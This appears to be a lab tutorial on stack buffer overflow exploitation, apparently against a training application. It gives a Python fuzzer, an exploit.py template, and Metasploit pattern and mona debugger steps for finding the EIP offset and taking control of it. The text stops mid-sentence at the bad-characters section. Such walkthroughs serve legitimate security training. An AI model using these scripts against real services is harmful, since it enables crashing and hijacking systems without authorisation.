## Fuzzing

- ``fuzz.py``

```
#!/usr/bin/env python3

import socket, time, sys

ip = "<RHOST>"      # target IP
port = "<RPORT>"    # target port (the port that the application is running on)
timeout = 5         # connection timeout

prefix = "OVERFLOW1 "
buffer = prefix + "A" * 100

while True:
  try: 
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:    # establish connection
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      
      print("Fuzzing with {} bytes".format(len(buffer) - len(prefix)))
      s.send(bytes(buffer, "latin-1"))
      s.recv(1024)
  
  except:
    print("Fuzzing crashed at {} bytes".format(len(buffer) - len(prefix)))
    sys.exit(0)
  
  buffer += 100 * "A"       # increase buffer size
  time.sleep(1)
```

After executing ``fuzz.py``, we'll see a console output similar to below:

```
Fuzzing with 100 bytes
Fuzzing with 200 bytes
...
Fuzzing with 2000 bytes
Fuzzing crashed at 2000 bytes
```

As we can see, our fuzzer crashed the application on 2000 bytes. Which means our offset should be in range of ``1900`` to ``2000". Note this down.

## Crash Replication & Controlling EIP

Next, we need to create our ``exploit.py`` file.

- ``exploit.py``:

```
import socket

ip = "<RHOST>"
port = <RPORT>

prefix = "OVERFLOW1 "
offset = 0                    # destination offset
overflow = "A" * offset       # try to reach to vulnerable offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")

except:
  print("Could not connect.")
```

For our ``PAYLOAD``, we need unique set of characters in order to spot exact offset value. To create a unique set of characters, we can use **"MSF Pattern Create"** script. We can create a pattern e.g. 2400 characters long:

```
msf-pattern_create -l 2400
```

This outputs:

```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4A
f5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al
0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5
Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0A
w1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb
6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1
Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6B
m7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs
2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7
Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2C
d3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci
8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3
Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8C
t9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz
4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9
```
We can put this output into our ``PAYLOAD`` section and re-run the ``exploit.py``:

```
# python3 exploit.py
Sending evil buffer...
Done!
```

After this, execute the following ``mona`` command in Immunity Debugger:

```
!mona findmsp -distance 2400
```

In output, we should see a line like this:

```
EIP contains normal pattern : <MEMORY_LOCATION> (offset <OFFSET_VALUE>)
```

In our case, we see:

```
EIP contains normal pattern : 0x6f43396e (offset 1978)
```

##

**NOTE:** Another method to find the offset is using ``msf-pattern_offset``. We can do the following:

```
# msf-pattern_offset -l <PATTERN_LENGTH> -q <EIP_VALUE>
```

In our case:

```
# msf-pattern_offset -l 2400 -q 6F43396E
[*] Exact match at offset 1978
```

##

Now we've found our offset value, which is ``1978``. This time, we need to update our ``offset`` value in our ``exploit.py`` file:

```
...
prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = ""
...
```

Note that not only we've changed the ``offset`` value, we also changed the ``retn`` value to ``BBBB`` and emptied out the ``payload`` part. The reason behind this is: we've emptied out ``payload`` because since we set our ``offset`` value to ``1978``, our buffer will be written full of ``A``'s up to offset ``1978`` and at this point, we don't need an extra payload for our testing process. We've set ``retn`` value as ``BBBB`` because we need to ensure that we can control the ``EIP``. If ``EIP`` gets filled out by the value ``42424242``, which equals to ``BBBB``, that means we spotted our offset value correctly.

Run ``exploit.py`` and check out the registers:

```
...
ESP 01A2FA30 ASCII "??"
EBP 41414141
ESI 00000000
EDI 00000000
EIP 42424242
...
```

As we can see, our test was successful. And we are in control of ``EIP``.

## Finding Bad Characters

Before finding **"Bad Chars"**, first we need to understand what a **Bad Character** is. A **Bad Character** is simply an unwanted character/list of unwanted characters that can break out our payload. We need to spot these bad chars and omit them from our payload. We can use the following ``mona`` command to 


















